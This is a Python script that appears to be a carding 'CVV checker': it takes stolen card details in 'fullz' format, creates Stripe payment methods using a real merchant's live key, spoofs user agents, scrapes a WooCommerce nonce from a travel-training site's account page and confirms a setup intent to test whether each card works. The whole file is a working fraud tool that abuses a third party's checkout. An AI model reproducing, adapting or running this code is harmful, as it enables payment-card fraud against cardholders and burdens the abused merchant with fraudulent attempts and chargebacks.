import asyncio
import re
from fake_useragent import UserAgent
from FUNC.defs import get_random_info

async def create_cvv_charge(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        user_agent = UserAgent().random

        # Step 1: Create payment method with Stripe
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': user_agent,
        }

        stripe_data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'allow_redisplay': 'unspecified',
            'billing_details[address][postal_code]': '10080',
            'billing_details[address][country]': 'US',
            'key': 'pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
        }

        pm_response = await session.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=stripe_headers,
            data=stripe_data
        )
        pm_data = await pm_response.json()
        payment_method_id = pm_data.get('id')
        if not payment_method_id:
            return await pm_response.text()

        # Step 2: Get nonce from travel institute
        get_headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'user-agent': user_agent,
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'navigate',
        }

        nonce_response = await session.get(
            'https://www.thetravelinstitute.com/my-account/add-payment-method/',
            headers=get_headers
        )
        html = await nonce_response.text()
        nonce_match = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html)
        if not nonce_match:
            return "Nonce extraction failed"
        nonce = nonce_match.group(1)

        # Step 3: Confirm setup intent
        confirm_headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.thetravelinstitute.com',
            'referer': 'https://www.thetravelinstitute.com/my-account/add-payment-method/',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': user_agent,
        }

        confirm_data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }

        confirm_response = await session.post(
            'https://www.thetravelinstitute.com/',
            headers=confirm_headers,
            data=confirm_data,
            params={'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
        )

        return await confirm_response.text()

    except Exception as e:
        return str(e)